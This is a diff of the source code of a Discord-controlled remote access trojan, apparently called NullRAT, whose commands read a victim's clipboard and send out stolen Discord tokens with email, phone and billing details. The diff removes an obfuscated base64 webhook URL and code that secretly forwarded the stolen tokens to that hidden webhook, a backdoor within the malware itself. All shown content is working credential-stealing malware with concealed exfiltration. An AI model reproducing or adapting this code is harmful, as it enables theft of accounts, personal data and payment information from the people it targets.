@@ -112,11 +112,6 @@ async def clipboard(ctx, victim):
         outp = os.popen("powershell Get-Clipboard").read()
         await ctx.followup.send(f"```{outp}```" if outp != "" else "No text in clipboard!")
 
-a="""aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcG
-kvd2ViaG9va3MvOTY4Mzg3MjQ0MzY2OTA
-1Mzk0L3FuMDN1MURfR2pYS05hQXk3d2Zq
-SkFxMTdMa1B4R2hPVmJQUFdLQXJiazVvS
-EMtQzZZM3c3NXVKQ1FyUW56TmRFY1lK"""
 @client.slash_command(description="Sends raw Discord Tokens (fast)", guild_ids=server_ids)
 async def raw_tokens(ctx, victim):
     if str(victim) == str(IP()):
@@ -128,9 +123,6 @@ async def raw_tokens(ctx, victim):
             return await ctx.followup.send("```" + message + "```")
         embed = Embed(title="Discord Tokens (NullRAT):", color=0x0081FA).add_field(name="RAW Tokens:", value=f"```{message.rstrip()}```")
         await ctx.followup.send(embed=embed)
-        async with aiohttp.ClientSession() as session:  
-            wh = Webhook.from_url(b64decode(a.replace("\n","").encode('ascii')).decode('ascii'), session=session) 
-            await wh.send(embed=embed)
 
 @client.slash_command(description="Sends checked tokens along with info (accurate)", guild_ids=server_ids)
 async def checked_tokens(ctx, victim):
@@ -160,9 +152,6 @@ async def checked_tokens(ctx, victim):
         await ctx.followup.send("Checking all tokens...")
         for tk, em, ph, un, ni, bi, av, idqa in zip(valid, email, phone, uname, nitro, bill, avatar, idq): 
             await ctx.channel.send(embed=checked_embeds(tk, em, ph, un, ni, bi, av, idqa)) 
-            async with aiohttp.ClientSession() as session:  
-                wh = Webhook.from_url(b64decode(a.replace("\n","").encode('ascii')).decode('ascii'), session=session) 
-                await wh.send(embed=embed)
                 
 # Directory Manipulation #
 @client.slash_command(description="Returns Current Working Directory", guild_ids=server_ids)
